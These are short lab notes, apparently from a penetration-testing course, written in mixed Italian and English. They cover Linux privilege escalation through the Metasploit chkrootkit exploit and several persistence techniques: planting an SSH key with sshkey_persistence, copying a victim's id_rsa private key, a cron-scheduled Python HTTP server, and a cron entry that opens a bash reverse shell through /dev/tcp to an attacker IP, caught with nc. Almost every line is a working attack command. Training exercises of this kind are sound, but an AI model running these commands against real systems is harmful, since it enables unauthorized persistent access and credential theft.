```
From Command Shell to Meterpreter Shell
> sessions -u 1
Vedo i processi attivi e investigo bash scripts per cercare eventuali versioni di applicativi installati e vulnerabili (es. chrootkit)
> ps aux
[/usr/sbin/cron]
[/bin/bash /bin/check/-down]
> cat /bin/check-down
[do /usr/local/bin/chkrootkit]
use exploit/unix/local/chkrootkit
set SESSION 2
set CHKROOTKIT /bin/chkrootkit (setto il path del chkrootkit binary)
run

upgrade command shell to Meterpreter shell
> session -u 3
> use post/linux/manage/sshkey_persistence
> set SESSION 4
> set CREATESSHFOLDER true
> exploit
Il modulo inserisce la chiave publica SSH nel file authorized_keys per potersi autenticare without a password
> ssh -i ssh_key root@192.168.80.3





## Linux Persistence - Copy SSH private keys
> meterpreter shell

Copu ssh private key from "~/.ssh/id_rsa"
> chmod 400 id_rsa
> ssh -i id_rsa student@192.37.104.3



Linux Persistence - Local Job Scheduling:

# Check Running Processes:
> ps -eaf
[Cron service is running /usr/sbin/cron]

Creo un cron job che starta un web server con python schedulato.
> echo "* * * * * cd /home/student/ && python -m SimpleHTTPServer"
[ Scansione nmap per verificare su quale porta Ã¨ stato aperto il Server ]
> curl 192.99.109.3:8000/flag.txt




Linux Persistence - Local 2nd Cron - Spawn bash shell with a specific port:
> echo "* * * * * /bin/bash -c 'bash -i >& /dev/tcp/192.175.36.2/1234 0>&1'" > cron
> crontab -i cron
crontab -l

logback again:
> ssh student@192.175.36.3
rm wait
> nc -nvlp 1234

```